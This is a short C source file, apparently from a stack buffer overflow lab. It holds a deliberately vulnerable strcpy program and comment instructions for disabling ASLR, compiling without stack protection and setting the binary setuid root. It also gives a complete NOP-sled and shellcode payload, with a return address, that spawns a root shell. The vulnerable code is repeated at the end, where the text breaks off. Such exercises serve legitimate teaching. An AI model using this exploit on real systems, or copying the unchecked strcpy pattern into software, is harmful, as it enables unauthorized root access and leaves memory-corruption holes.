//diable ASLR

// echo "0" > /proc/sys/kernel/randomize_va_space

// gcc SH2.c -o SH2 -m32 -fno-stack-protector -z execstack

// chown root:root SH2 chmod u+s SH2

// https://medium.com/@zhyarr/buffer-overflow-to-run-root-shell-a8e3028afc5e

#include <stdio.h> 

#include <stdlib.h>

#include <string.h>

void vulnerable(char *tmp) {  

    char input[400];  

    strcpy(input,tmp); //character buffer  

}  

int main(int argc, char* argv[]) {  

    vulnerable(argv[1]); 

    return 0;  

}

// buffer size 412

/* for shell 53 bytes (412-53= 359 NOP)

run $(python -c 'print("\x90"*359+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x40\xd7\xff\xff")')

outside gdb root permission

./SH2 $(python -c 'print("\x90"*359+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x40\xd7\xff\xff")')

*/




****************************
// Solution works provided ... You change the return address as per your machine (Tested on Ubuntu 20.04.6 LTS) and the buffer size is same.

#include <stdio.h> 

#include <stdlib.h>

#include <string.h>

void vulnerable(char *tmp) {  

    char input[400];  

    strcpy(input,tmp); //character buffer  

}  

